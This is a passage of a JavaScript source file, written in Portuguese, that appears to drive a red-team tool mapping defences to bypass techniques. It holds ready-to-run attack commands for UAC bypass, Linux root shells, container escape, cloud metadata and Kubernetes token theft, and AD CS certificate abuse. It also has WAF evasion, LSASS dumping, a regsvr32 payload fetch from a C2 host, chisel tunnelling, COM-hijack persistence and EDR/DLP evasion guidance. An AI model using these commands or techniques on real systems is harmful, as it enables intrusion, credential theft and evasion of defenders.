    symptom: 'O utilizador pertence ao grupo local `Administrators`, mas `whoami /priv` mostra apenas poucos privilégios (`Medium Mandatory Level`) e operações administrativas dão "Access Denied".',
    academicContext: 'Com UAC ativo, quando um membro do grupo Administrators inicia sessão, o LSA cria dois Access Tokens: um Filtered Token (`Medium Integrity`) usado pelo `explorer.exe` e um Full Admin Token (`High Integrity`) ligado ao primeiro (`TokenLinkedToken`), que exige elevação via `consent.exe`.',
    bypassSteps: [
      {
        title: "1. Binários com elevação automática e Registry Hijacking (fodhelper / computerdefaults)",
        description: 'Binários assinados pela Microsoft com `<autoElevate>true</autoElevate>` no manifesto (`fodhelper.exe`, `computerdefaults.exe`, `sdclt.exe`) consultam chaves em `HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command` antes de executar em High Integrity.',
        command: 'reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /t REG_SZ /d "cmd.exe /c start C:\\Windows\\Tasks\\shell.exe" /f\nfodhelper.exe',
        mitreIds: ['T1548.002', 'T1112'],
        opsecRisk: 'MÉDIO'
      },
      {
        title: '2. Abuso de Interface COM Auto-Elevada (ICMLuaUtil / ColorDataProxy)',
        description: 'Fazer Masquerading do PEB do processo atual para fingir ser `explorer.exe` (`T1036.004`) e instanciar o objeto COM `CMSTPLUA` (`{3E5FC7F9-9A51-4367-9063-A120244FBEC7}`) via `CoGetObject("Elevation:Administrator!new:{...}")` para executar comandos em High Integrity.',
        command: '// Via BOF/C#: CoGetObject("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}") -> ShellExec()',
        mitreIds: ['T1548.002', 'T1559.001'],
        opsecRisk: 'STEALTH'
      },
      {
        title: '3. Duplicação de Token a partir de Processo High Integrity já em Execução',
        description: 'Se `ConsentPromptBehaviorAdmin` não for `2` (Always Notify) e já existir um processo elevado a correr na mesma sessão de utilizador, abrir o processo com `PROCESS_QUERY_LIMITED_INFORMATION`, duplicar o seu token com `DuplicateTokenEx` e invocar `ImpersonateLoggedOnUser` + `CreateProcessWithTokenW`.',
        command: '// Token Duplication de processo High Integrity existente na mesma Logon Session',
        mitreIds: ['T1134.001', 'T1548.002'],
        opsecRisk: 'STEALTH'
      }
    ],
    lolbasTools: ['fodhelper.exe', 'computerdefaults.exe', 'eventvwr.exe', 'sdclt.exe', 'cmstp.exe']
  },
  {
    id: 'blk-linux-privesc-hardened',
    title: "Linux reforçado: sem sudo, sem SUIDs habituais e com AppArmor/SELinux ativo",
    category: "Escalada de privilégios",
    severity: 'ALTO',
    defenseMechanism: 'Linux Hardening (No Sudoers, `nosuid` mounts, AppArmor/SELinux Enforcing, Kernel `dmesg_restrict=1`)',
    symptom: 'Acesso shell como `www-data` ou utilizador comum; `sudo -l` pede password ou diz não permitido, e `find / -perm -4000` não revela binários GTFOBins óbvios.',
    academicContext: 'Sistemas Linux modernos mitigam binários SUID clássicos e restringem o acesso a ponteiros de kernel (`kptr_restrict=2`), exigindo enumeração de Linux Capabilities, namespaces, sockets internos, cronjobs/systemd timers ou vulnerabilidades de Polkit/glibc.',
    bypassSteps: [
      {
        title: '1. Enumeração de Linux File Capabilities (`getcap`)',
        description: 'Muitos administradores removem o bit SUID mas atribuem `cap_setuid+ep`, `cap_dac_read_search` ou `cap_sys_admin` a interpretadores (`python3`, `perl`, `node`, `tar`, `openssl`).',
        command: 'getcap -r / 2>/dev/null\n# Se python3 tiver cap_setuid+ep:\npython3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        mitreIds: ['T1548.001', 'T1059.006'],
        opsecRisk: 'STEALTH'
      },
      {
        title: "2. Monitorização de processos efémeros, tarefas cron ocultas (`pspy`) e temporizadores systemd",
        description: 'Monitorizar `/proc` em loop rápido sem precisar de root para detetar scripts executados periodicamente por `root` com permissões de escrita, Wildcard Injection (`tar *`) ou `PATH` hijacking.',
        command: 'systemctl list-timers --all\n# Verificar sockets UNIX graváveis (ex: docker.sock, containerd.sock, supervisord):\nfind / -type s -writable 2>/dev/null',
        mitreIds: ['T1053.003', 'T1053.006', 'T1574.007'],
        opsecRisk: 'BAIXO'
      },
      {
        title: '3. Exploração de User Namespaces / Polkit / Dynamic Loader (Looney Tunables)',
        description: 'Verificar se `kernel.unprivileged_userns_clone=1` permite criar user namespaces para explorar subsistemas de kernel (`nf_tables`) ou vulnerabilidades no dynamic loader `ld.so` (`GLIBC_TUNABLES`).',
        command: 'sysctl kernel.unprivileged_userns_clone\nldd --version',
        mitreIds: ['T1068', 'T1548'],
        opsecRisk: 'MÉDIO'
      }
    ],
    lolbasTools: ['getcap', 'systemctl', 'busctl', 'pkexec', 'gdb', 'python3', 'tar']
  },
  {
    id: 'blk-container-escape',
    title: "Isolado num container Docker ou pod Kubernetes",
    category: "Escalada de privilégios e cloud",
    severity: 'ALTO',
    defenseMechanism: 'Linux Namespaces (`pid`, `net`, `mnt`), Control Groups (`cgroups`) e Seccomp/AppArmor Profiles',
    symptom: 'O RCE colocou-te dentro de um container efêmero (`/.dockerenv` presente ou `/proc/1/cgroup` aponta para `kubepods`), sem acesso aos ficheiros do host nem à rede interna principal.',
    academicContext: 'Containers partilham o mesmo kernel do Host, mas estão isolados por Linux Namespaces e capacidades limitadas. A fuga (Container Escape) ou movimentação lateral no cluster explora má configuração de privilégios (`--privileged`, `CAP_SYS_ADMIN`), sockets montados ou Service Account Tokens do Kubernetes.',
    bypassSteps: [
      {
        title: '1. Abuso de Kubernetes ServiceAccount Token (`/var/run/secrets/kubernetes.io`)',
        description: 'Ler o JWT montado por defeito no Pod e consultar a API do Kubernetes para listar segredos do namespace, ler outros pods ou criar um novo Pod privilegiado com `hostPath: /` montado.',
        command: 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\ncurl -sk -H "Authorization: Bearer $TOKEN" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/pods',
        mitreIds: ['T1528', 'T1610', 'T1613'],
        opsecRisk: 'BAIXO'
      },
      {
        title: "2. Fuga para o host através de `CAP_SYS_ADMIN` / `--privileged` / `docker.sock`",
        description: 'Se o container correr como privilegiado (`CapEff: 0000003fffffffff`), montar diretamente o disco físico do host (`/dev/sda1` ou `/dev/nvme0n1p1`) ou abusar de `cgroup release_agent` / `core_pattern` em `/proc/sys/kernel/core_pattern`.',
        command: 'capsh --print\nfdisk -l\nmkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host /bin/bash',
        mitreIds: ['T1611', 'T1609'],
        opsecRisk: 'MÉDIO'
      },
      {
        title: "3. Acesso à API de metadados da cloud (IMDSv1 / IMDSv2 - 169.254.169.254)",
        description: 'Se o cluster correr em AWS EKS, Azure AKS ou GCP GKE, consultar o Instance Metadata Service a partir do container para roubar as credenciais IAM do Worker Node.',
        command: 'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")\ncurl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        mitreIds: ['T1552.005', 'T1078.004'],
        opsecRisk: 'STEALTH'
      }
    ],
    lolbasTools: ['capsh', 'mount', 'nsenter', 'curl', 'kubectl']
  },
  {
    id: 'blk-adcs-kerberos-hardened',
    title: "Active Directory reforçado: sem contas frágeis expostas a Kerberoasting e com LAPS ativo",
    category: "Acesso a credenciais e Active Directory",
    severity: 'ALTO',
    defenseMechanism: 'Group Managed Service Accounts (gMSA - senhas de 120 chars), LAPS, Tiered Administration e SMB Signing',
    symptom: 'BloodHound não mostra caminhos diretos de `GenericAll` para Domain Admins; todas as contas de serviço usam senhas longas/gMSA impossíveis de quebrar offline e o SMB Signing impede NTLM Relay clássico para SMB.',
    academicContext: 'Em ambientes Active Directory maduros, os vetores clássicos (Kerberoasting RC4, LLMNR Poisoning -> SMB Relay) são mitigados. O foco ofensivo desloca-se para Active Directory Certificate Services (AD CS), Resource-Based Constrained Delegation (RBCD), Shadow Credentials e ACLs subtis.',
    bypassSteps: [
      {
        title: "1. Auditoria e abuso de modelos de certificados AD CS (ESC1, ESC4, ESC8)",
        description: 'Enumerar Certificate Authorities e Templates com `Certipy`. Se um template permitir `ENROLLEE_supplies_subject` (ESC1) para Domain Computers/Users, requisitar um certificado com SAN de um Domain Admin. Se o Web Enrollment (`http://ca/certsrv`) estiver ativo, realizar NTLM Relay para HTTP (ESC8 - não é afetado por SMB Signing!).',
        command: 'certipy find -u user@dominio.local -p \'Password123\' -dc-ip 10.10.10.5 -vulnerable -stdout\ncertipy req -u user@dominio.local -p \'Password123\' -ca CORP-CA -template VulnTemplate -upn administrator@dominio.local',
        mitreIds: ['T1649', 'T1557.001', 'T1558'],
        opsecRisk: 'STEALTH'
      },
      {
        title: '2. Shadow Credentials (`msDS-KeyCredentialLink`) & RBCD (`msDS-AllowedToActOnBehalfOfOtherIdentity`)',
        description: 'Se tivermos `GenericWrite` sobre um computador ou conta (ou usando `MachineAccountQuota >= 1` para criar um computador próprio), injetar uma chave pública em `msDS-KeyCredentialLink` (Whisker/Certipy) para obter o TGT e NTLM hash da conta sem alterar a sua password.',
        command: 'certipy shadow auto -u user@dominio.local -p \'Password123\' -account SRV-ALVO$',
        mitreIds: ['T1556.006', 'T1098', 'T1550.003'],
        opsecRisk: 'STEALTH'
      },
      {
        title: "3. Leitura de palavras-passe gMSA (`msDS-ManagedPassword`)",
        description: 'Contas gMSA não podem ser crackadas, mas se comprometermos um host ou grupo autorizado no atributo `PrincipalsAllowedToRetrieveManagedPassword`, podemos ler o blob `msDS-ManagedPassword` diretamente via LDAP sobre TLS e calcular o hash NTLM/AES.',
        command: 'gMSADumper.py -u \'MAQUINA$\' -p \':NTLMHASH\' -d dominio.local -l 10.10.10.5',
        mitreIds: ['T1552', 'T1087.002'],
        opsecRisk: 'BAIXO'
      }
    ],
    lolbasTools: ['certreq.exe', 'certutil.exe', 'ldifde.exe', 'dsquery.exe']
  },
  {
    id: 'blk-waf-web-exploit',
    title: "WAF (Cloudflare / AWS WAF / ModSecurity) a bloquear payloads SQLi / RCE e carregamentos de ficheiros",
    category: "Acesso inicial e aplicações web",
    severity: 'ALTO',
    defenseMechanism: 'Web Application Firewall (WAF) Deep Packet Inspection, CRS Ruleset e Rate Limiting',
    symptom: 'Conseguiste identificar uma vulnerabilidade na aplicação web (SQL Injection, SSTI, Deserialization ou File Upload), mas qualquer payload funcional devolve `403 Forbidden` do WAF.',
    academicContext: 'WAFs operam como proxies reversos que analisam cabeçalhos HTTP, URI e corpo do pedido através de expressões regulares e heurísticas. Contudo, os WAFs possuem limites de tamanho de buffer de inspeção (`RequestBodyLimit`), discrepâncias de parsing entre o WAF e o servidor backend (HTTP Parameter Pollution / Content-Type Smuggling) e cegueira para o IP de origem real se não estiver isolado.',
    bypassSteps: [
      {
        title: "1. Descoberta direta do IP de origem (contorno de CDN/WAF)",
        description: 'Consultar certificados históricos (`crt.sh` / Censys), registos DNS antigos (SecurityTrails), registos SPF/MX ou forçar a aplicação a fazer um pedido SSRF/Out-of-Band para descobrir o IP real do servidor backend e enviar o exploit diretamente para o IP com o header `Host:` configurado.',
        command: 'curl -sk -H "Host: app.alvo.com" https://IP_REAL_ORIGEM/api/vuln-endpoint -d "payload"',
        mitreIds: ['T1190', 'T1590.002', 'T1596'],
        opsecRisk: 'STEALTH'
      },
      {
        title: "2. Preenchimento do corpo HTTP (WAF Buffer Overflow / contorno dos limites de inspeção)",
        description: 'Muitos WAFs Cloud (ex: AWS WAF / Azure WAF) inspecionam apenas os primeiros 8 KB, 16 KB ou 64 KB do corpo de um pedido `POST` por motivos de latência. Preceder o parâmetro malicioso com 65 KB de parâmetros ou JSON junk legítimo faz o WAF deixar passar o resto sem inspeção.',
        command: 'python3 -c \'print("junk=" + "A"*70000 + "&cmd=id")\' | curl -X POST -d @- https://app.alvo.com/endpoint',
        mitreIds: ['T1190', 'T1027'],
        opsecRisk: 'BAIXO'
      },
      {
        title: "3. Alteração da codificação (Charset `ibm037` / `utf-16be` / Chunked Transfer / JSON Unicode)",
        description: 'Enviar o corpo do pedido codificado em `Content-Type: application/x-www-form-urlencoded; charset=ibm037` ou usar escapes Unicode em JSON (`\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074`) que o WAF não descodifica mas o framework backend (Spring/ASP.NET/Node) processa nativamente.',
        command: 'curl -X POST https://app.alvo.com/api -H "Content-Type: application/json" -d \'{"query":"\\u0055\\u004e\\u0049\\u004f\\u004e \\u0053\\u0045\\u004c\\u0045\\u0043\\u0074..."}\'',
        mitreIds: ['T1190', 'T1132.001'],
        opsecRisk: 'BAIXO'
      }
    ],
    lolbasTools: ['curl', 'openssl']
  },
  {
    id: 'blk-mfa-entra-cloud',
    title: "MFA e Conditional Access a bloquear o acesso à cloud (Entra ID / Microsoft 365 / AWS)",
    category: "Acesso inicial e cloud",
    severity: 'CRÍTICO',
    defenseMechanism: 'Multi-Factor Authentication (FIDO2 / Authenticator Number Matching) + Entra ID Conditional Access (Device Compliance / IP Location)',
    symptom: 'Obtiveste credenciais válidas de um utilizador ou administrador Cloud, mas o login bloqueia por exigir MFA ou um dispositivo "Compliant / Hybrid Azure AD Joined".',
    academicContext: 'O Conditional Access avalia sinais no momento da emissão do token OAuth2/OIDC (localização de rede, estado de conformidade Intune e reivindicações MFA). Contudo, tokens de sessão já emitidos no endpoint da vítima ou fluxos de autenticação delegados permitem contornar essa barreira.',
    bypassSteps: [
      {
        title: "1. Extração de Primary Refresh Token (PRT) e cookies de sessão no endpoint",
        description: 'Se já tens execução na estação Windows da vítima (Hybrid Joined), extrair o PRT ou usar `ROADtoken` / Mimikatz `sekurlsa::cloudap` para derivar um cookie `x-ms-RefreshTokenCredential` válido que já inclui a claim de MFA e Device Compliance.',
        command: 'roadtx.exe prt -a renew\n// Ou injetar Cookie ESTSAUTHPERSISTENT extraído do browser da vítima',
        mitreIds: ['T1528', 'T1539', 'T1550.001'],
        opsecRisk: 'STEALTH'
      },
      {
        title: '2. Proxy AitM (Evilginx) ou Device Code Phishing (Fluxo OAuth 2.0)',
        description: 'Iniciar um fluxo de Device Code (`https://microsoft.com/devicelogin`) com `TokenTactics` / `RoadTools` ou usar um proxy reverso AitM para capturar o Refresh Token imediatamente após a vítima aprovar o MFA.',
        command: 'Import-Module .\\TokenTactics.psd1\nGet-AzureToken -Client MSGraph',
        mitreIds: ['T1528', 'T1557', 'T1566.002'],
        opsecRisk: 'BAIXO'
      },
      {
        title: "3. Túnel do navegador através da máquina da vítima (SOCKS5 e correspondência de User-Agent)",
        description: 'Quando o Conditional Access restringe por IP Corporativo e Device ID, correr um proxy SOCKS no beacon da máquina da vítima ou usar `SharpChrome` / Remote Debugging Port (`--remote-debugging-port=9222`) no próprio browser da vítima.',
        command: 'chisel.exe client https://c2:8443 R:socks',
        mitreIds: ['T1090.001', 'T1185'],
        opsecRisk: 'STEALTH'
      }
    ],
    lolbasTools: ['dsregcmd.exe', 'msedge.exe (--headless --dump-dom)', 'curl.exe']
  },
  {
    id: 'blk-sysmon-siem-recon',
    title: "SOC / SIEM a detetar comandos de reconhecimento (`whoami`, `net`, `nltest`, `arp`)",
    category: "Descoberta e furtividade",
    severity: 'MÉDIO',
    defenseMechanism: 'Sysmon Event ID 1 (Process Creation) + Windows Security Event ID 4688 (Command-Line Auditing) + EDR Behavioral Rules',
    symptom: 'Assim que executas `whoami /all`, `net group "Domain Admins" /domain` ou `SharpHound`, o SOC recebe um alerta de severidade alta e isola o host.',
    academicContext: 'Regras Sigma padrão em qualquer SIEM monitorizam a criação de processos filhos de `cmd.exe`/`powershell.exe` que invoquem binários clássicos de enumeração (`whoami.exe`, `net.exe`, `net1.exe`, `nltest.exe`, `quser.exe`, `tasklist.exe`) num curto intervalo de tempo.',
    bypassSteps: [
      {
        title: "1. Descoberta dentro do processo através de BOFs (Beacon Object Files) e APIs Win32/Native",
        description: 'Nunca criar novos processos (`CreateProcess`) para enumeração. Executar BOFs em memória dentro do próprio processo do agente que chamam diretamente `GetTokenInformation`, `NetGroupGetUsers`, `DsEnumerateDomainTrusts` ou `NtQuerySystemInformation`.',
        command: '// Em Cobalt Strike / Sliver / Havoc (Zero Process Creation):\ninline-execute situ_awareness_bof.o\nldapsearch "(adminCount=1)" --attributes samaccountname',
        mitreIds: ['T1106', 'T1087.002', 'T1033'],
        opsecRisk: 'STEALTH'
      },
      {
        title: '2. Command-Line Spoofing via Modificação da Estrutura PEB',
        description: 'Se for estritamente necessário lançar um processo externo, criá-lo com a flag `CREATE_SUSPENDED` e argumentos falsos benignos (`msiexec.exe /i update.msi`), sobrescrever `PEB->ProcessParameters->CommandLine` na memória remota com os argumentos reais e invocar `ResumeThread`. O Event ID 4688/Sysmon ID 1 registará apenas o argumento falso.',
        command: '// CreateProcessW(..., "cmd.exe /c echo ok", CREATE_SUSPENDED) -> WriteProcessMemory(PEB.CommandLine) -> ResumeThread()',
        mitreIds: ['T1036.004', 'T1562'],
        opsecRisk: 'BAIXO'
      },
      {
        title: "3. Recolha ADSI / LDAP com limitação da frequência e jitter (BloodHound discreto)",
        description: "Em vez de correr `SharpHound -c All` (que gera milhares de ligações SMB em segundos), usar `--CollectionMethod DCOnly` (apenas consultas LDAP ao DC, zero ligações SMB para workstations) com `--Throttle` e `--Jitter`.",
        command: 'SharpHound.exe --CollectionMethod DCOnly --Throttle 1500 --Jitter 30',
        mitreIds: ['T1087.002', 'T1069.002', 'T1482'],
        opsecRisk: 'STEALTH'
      }
    ],
    lolbasTools: ['dsquery.exe', 'ldifde.exe', 'csvde.exe']
  },
  {
    id: 'blk-persistence-autoruns',
    title: 'Persistência Removida pelo Blue Team: Run Keys e Scheduled Tasks Detetadas',
    category: "Persistência e furtividade",
    severity: 'MÉDIO',
    defenseMechanism: 'Sysinternals Autoruns Auditing + Sysmon Event ID 13 (Registry) + Event ID 4698 (Scheduled Task Created)',
    symptom: 'Chaves em `HKCU\\...\\Run` ou tarefas `schtasks /create` são rapidamente identificadas e limpas pelos analistas de resposta a incidentes.',
    academicContext: 'Locais canónicos de autostarts (`Run`, `RunOnce`, pasta `Startup`, serviços básicos) são continuamente varridos por EDRs. Uma persistência resiliente deve ser acionada por eventos do sistema ou sequestrar objetos COM (`CLSID`) já carregados por aplicações cotidianas.',
    bypassSteps: [
      {
        title: '1. COM Hijacking em `HKCU\\Software\\Classes\\CLSID` (InprocServer32)',
        description: 'Identificar um CLSID frequentemente instanciado pelo `explorer.exe` ou `taskhostw.exe` que procure primeiro em `HKCU` antes de `HKLM` (via ProcMon). Registar a nossa DLL proxy em `HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32` sem precisar de privilégios de Admin.',
        command: 'reg add "HKCU\\Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32" /ve /t REG_SZ /d "C:\\Users\\Public\\Libraries\\thumbcache_proxy.dll" /f',
        mitreIds: ['T1546.015', 'T1112'],
        opsecRisk: 'STEALTH'
      },
      {
        title: '2. WMI Event Subscription Persistente (`__EventFilter` + `CommandLineEventConsumer`)',
        description: 'Quando com privilégios elevados, criar uma subscrição WMI no repositório `root\\subscription` acionada por um evento de sistema (ex: 5 minutos após o boot ou falha de logon específica), oculta das listas normais de tarefas.',
        command: '// Registar __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding em root\\subscription',
        mitreIds: ['T1546.003'],
        opsecRisk: 'BAIXO'
      },
      {
        title: "3. Persistência ao nível da identidade / domínio (Silver Ticket / AdminSDHolder / Shadow Credentials)",
        description: 'Em vez de persistir num host monitorizado com EDR, persistir na camada de identidade do Active Directory adicionando uma chave em `msDS-KeyCredentialLink` de uma conta de computador ou adicionando uma ACL `WriteDacl` no contentor `CN=AdminSDHolder,CN=System`.',
        command: 'certipy shadow add -u admin@dominio.local -p \'Pass\' -account DC01$',
        mitreIds: ['T1098', 'T1556.006', 'T1484'],
        opsecRisk: 'STEALTH'
      }
    ],
    lolbasTools: ['reg.exe', 'mofcomp.exe', 'wbemtest.exe']
  },
  {
    id: 'blk-dlp-exfiltration',
    title: "DLP (Data Loss Prevention) a bloquear o carregamento ou a exfiltração de ficheiros",
    category: "Exfiltração",
    severity: 'MÉDIO',
    defenseMechanism: 'Enterprise DLP (Symantec / Purview / Forcepoint) + Proxy Upload Quota & Content Inspection',
    symptom: 'Tentativas de enviar arquivos `.zip`/`.7z` ou dumps de base de dados para fora da rede são bloqueadas pelo Proxy ou geram alerta de DLP.',
    academicContext: 'Soluções de DLP inspecionam cabeçalhos mágicos de ficheiros (Magic Bytes), entropia elevada, padrões regex (cartões de crédito, PII, confidencial) em uploads HTTP `POST`/`PUT` e anexos de e-mail, além de bloquear domínios de file-sharing.',
    bypassSteps: [
      {
        title: "1. Cifragem personalizada e esteganografia / camuflagem de formato (blocos de baixa entropia)",
        description: 'Cifrar os dados com AES-256, codificar em Base64/Words de baixa entropia e embutir em estruturas JSON ou imagens PNG válidas, dividindo em pequenos blocos (`Data Transfer Size Limits`) enviados com delays pelo próprio canal de C2.',
        command: '// Dividir arquivo cifrado em chunks de 64KB enviados em pedidos GET/POST JSON normais com jitter',
        mitreIds: ['T1030', 'T1027', 'T1041', 'T1001.002'],
        opsecRisk: 'STEALTH'
      },
      {
        title: "2. Exfiltração para armazenamento empresarial autorizado na cloud (OneDrive / SharePoint / S3)",
        description: 'O DLP de rede geralmente confia no tráfego destinado ao tenant Microsoft 365 ou AWS S3/GitHub Enterprise usando APIs oficiais HTTPS.',
        command: 'curl -X PUT -H "Authorization: Bearer $GRAPH_TOKEN" --data-binary @dados.bin "https://graph.microsoft.com/v1.0/me/drive/root:/backup_telemetry.dat:/content"',
        mitreIds: ['T1567.002'],
        opsecRisk: 'STEALTH'
      }
    ],
    lolbasTools: ['certutil.exe (-encode)', 'tar.exe', 'makecab.exe', 'curl.exe']
  }
];

export const LOLBAS_ARSENAL = [
  {
    binary: 'MSBuild.exe',
    platform: 'Windows',
    mitreId: 'T1127.001',
    purpose: 'Execução de código C# arbitrário inline (.csproj) contornando AppLocker, WDAC e Constrained Language Mode.',
    syntax: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml'
  },
  {
    binary: 'InstallUtil.exe',
    platform: 'Windows',
    mitreId: 'T1218.004',
    purpose: 'Execução do método [Uninstall] de qualquer assembly .NET assinado/não-assinado contornando restrições de execução.',
    syntax: 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll'
  },
  {
    binary: 'rundll32.exe (comsvcs.dll)',
    platform: 'Windows',
    mitreId: 'T1003.001',
    purpose: 'Criação nativa de minidump de memória de processos (ex: lsass.exe) usando DLL nativa assinada pela Microsoft.',
    syntax: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Tasks\\debug.bin full'
  },
  {
    binary: 'regsvr32.exe',
    platform: 'Windows',
    mitreId: 'T1218.010',
    purpose: 'Squiblydoo: Execução remota ou local de scriptlets COM (.sct) sem registar a DLL no sistema.',
    syntax: 'regsvr32.exe /s /n /u /i:https://c2.dominio.com/payload.sct scrobj.dll'
  },
  {
    binary: 'certutil.exe',
    platform: 'Windows',
    mitreId: 'T1140',
    purpose: 'Download de ficheiros (Ingress Tool Transfer) e codificação/descodificação Base64 ou Hex nativa.',
    syntax: 'certutil.exe -decode encoded.txt payload.dll'
  },
  {
    binary: 'fodhelper.exe',
    platform: 'Windows',
    mitreId: 'T1548.002',
    purpose: 'Bypass de UAC (Medium -> High Integrity) via sequestro da chave HKCU\\Software\\Classes\\ms-settings.',
    syntax: 'fodhelper.exe'
  },
  {
    binary: 'certreq.exe',
    platform: 'Windows / AD',
    mitreId: 'T1649',
    purpose: 'Requisição nativa de certificados AD CS e exfiltração/POST HTTP nativo.',
    syntax: 'certreq.exe -submit -attrib "CertificateTemplate:SubCA" request.inf cert.cer'
  },
  {
    binary: 'getcap / setcap',
    platform: 'Linux',
    mitreId: 'T1548.001',
    purpose: 'Identificação e exploração de Linux Capabilities (ex: cap_setuid+ep) para escalada de privilégios até root.',
    syntax: 'getcap -r / 2>/dev/null'
  },
  {
    binary: 'python3 / perl (memfd_create)',
    platform: 'Linux',
    mitreId: 'T1620',
    purpose: 'Execução Fileless de binários ELF diretamente da memória RAM sem tocar no disco (/proc/self/fd/).',
    syntax: 'python3 -c "import os,ctypes; fd=os.memfd_create(\'kworker\',0); os.write(fd,open(\'elf\',\'rb\').read()); os.execve(f\'/proc/self/fd/{fd}\',[\'kworker\'],{})"'
  },
  {
    binary: 'nsenter',
    platform: 'Linux / Containers',
    mitreId: 'T1611',
    purpose: 'Fuga de container privilegiado (hostPID: true) entrando diretamente nos namespaces do processo init (PID 1) do Host.',
    syntax: 'nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash'
  }
];

// Gerador de guia tático de desbloqueio (Pentester Bypass) para cada técnica individual baseado nas suas táticas, plataformas e mitigações
export function buildTechniqueBypassGuide(technique, mitigations, detections, siblings) {
  const platforms = technique.platforms || [];
  const tactics = technique.tactics || [];
  const isWin = platforms.includes('Windows');
  const isLin = platforms.includes('Linux');
  const isCloud = platforms.some(p => /AWS|Azure|GCP|IaaS|SaaS|Office 365|Entra|Identity/i.test(p));
  const isAD = platforms.includes('Windows') || platforms.some(p => /Identity|Active Directory/i.test(p));

  const blockers = [];
  const bypasses = [];

  // Mapear a partir das mitigações reais da técnica
  for (const m of mitigations) {
    const mapped = MITIGATION_BYPASS_MAP[m.id];
    if (mapped) {
      blockers.push(`${m.id} (${m.name}): ${mapped.blockerSymptom}`);
      bypasses.push(mapped.bypassStrategyPt);
    }
  }

  // Enriquecer por tática caso a técnica tenha poucas mitigações explícitas
  if (tactics.includes('execution')) {
    if (isWin && blockers.length === 0) {
      blockers.push('Bloqueio de interpretador (AMSI / PowerShell CLM / AppLocker / EDR Process Creation Callbacks).');
      bypasses.push('Utilizar execução in-memory via Unmanaged PowerShell (`System.Management.Automation.dll`), binários assinados LOLBAS (`MSBuild.exe`, `InstallUtil.exe`, `Regsvr32.exe`) ou Parent PID Spoofing com bloqueio de DLLs não-Microsoft (`PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY`) para evitar deteções heurísticas.');
    } else if (isLin && blockers.length === 0) {
      blockers.push('Monitorização de `execve` via `auditd`/EDR Linux ou restrições de AppArmor/SELinux/noexec em `/tmp`.');
      bypasses.push('Executar payloads diretamente a partir da memória usando `memfd_create` (Fileless Linux Execution via `/proc/self/fd/<N>`) ou interpretadores nativos (`python3`, `perl`) evitando escrita em partições montadas com `noexec`.');
    }
  }

  if (tactics.includes('credential-access')) {
    if (isWin && !bypasses.some(b => b.includes('RunAsPPL'))) {
      blockers.push('Proteção de memória de credenciais (RunAsPPL, Credential Guard, EDR Handle Monitoring em `Sysmon EventID 10`).');
      bypasses.push('Evitar abrir handles diretos com `PROCESS_VM_READ`. Preferir extração indireta via SSPI/Kerberos (`Rubeus tgtdeleg` / `kerberoast`), decifragem offline de blobs DPAPI usando a Backup Key do domínio, extração de SAM/SECURITY via registo/VSS ou abuso de certificados AD CS (`T1649`).');
    }
  }

  if (tactics.includes('stealth') || tactics.includes('defense-impairment')) {
    blockers.push('Inspeção de telemetria comportamental por EDR (ETW Threat Intelligence, User-Mode Inline Hooks em `ntdll.dll`, Memory Scanners para páginas `RWX`).');
    bypasses.push('Aplicar Indirect Syscalls com Call Stack Spoofing, evitar permissões de memória `RWX` simultâneas (usar padrão `RW` -> `RX` com Sleep Encryption como Ekko/Cronos durante períodos de inatividade do beacon) e realizar patching de `EtwEventWrite` no processo local.');
  }

  if (tactics.includes('lateral-movement')) {
    blockers.push('Segmentação de rede (VLANs), bloqueio de portas administrativas (445/5985/3389), SMB Signing obrigatório ou restrições de NTLM.');
    bypasses.push('Pivotar para protocolos alternativos como DCOM (`MMC20.Application`), WMI sobre RPC, MSSQL Links (`1433`), RDP em modo `RestrictedAdmin`, ou autenticação Kerberos com chaves AES256 (`Overpass-the-Hash`) usando o FQDN do host em vez do endereço IP.');
  }

  if (tactics.includes('privilege-escalation')) {
    blockers.push('Controlo de elevação (UAC em Windows / falta de permissões sudo ou SUID em Linux / políticas IAM restritivas em Cloud).');
    bypasses.push(isWin
      ? 'Explorar objetos COM auto-elevados (`ICMLuaUtil`), sequestro de chaves em `HKCU\\Software\\Classes` lidas por binários `autoElevate`, abuso de privilégios de Token (`SeImpersonatePrivilege` via PrintSpoofer/GodPotato) ou DLL Hijacking em serviços `SYSTEM`.'
      : 'Enumerar Linux Capabilities (`getcap -r /`), sockets UNIX graváveis (`docker.sock`), timers systemd mal configurados, variáveis `LD_PRELOAD`/`PATH` ou permissões de IAM Role PassRole em ambientes Cloud.');
  }

  if (tactics.includes('command-and-control') || tactics.includes('exfiltration')) {
    blockers.push('Firewall Egress restritiva, Proxy com inspeção SSL/TLS e bloqueio de domínios sem reputação ou DLP ativo.');
    bypasses.push('Empregar canais sobre Web Services legítimos permitidos (Microsoft Graph, GitHub, OneDrive), respeitar o Proxy do sistema via `WinINet` com credenciais integradas da sessão atual, aplicar jitter/sleep randomization e fragmentar transferências abaixo dos limiares de DLP.');
  }

  if (blockers.length === 0) {
    blockers.push('Monitorização de telemetria SIEM/EDR, regras de correlação Sigma e controlos de acesso baseados em políticas de menor privilégio.');
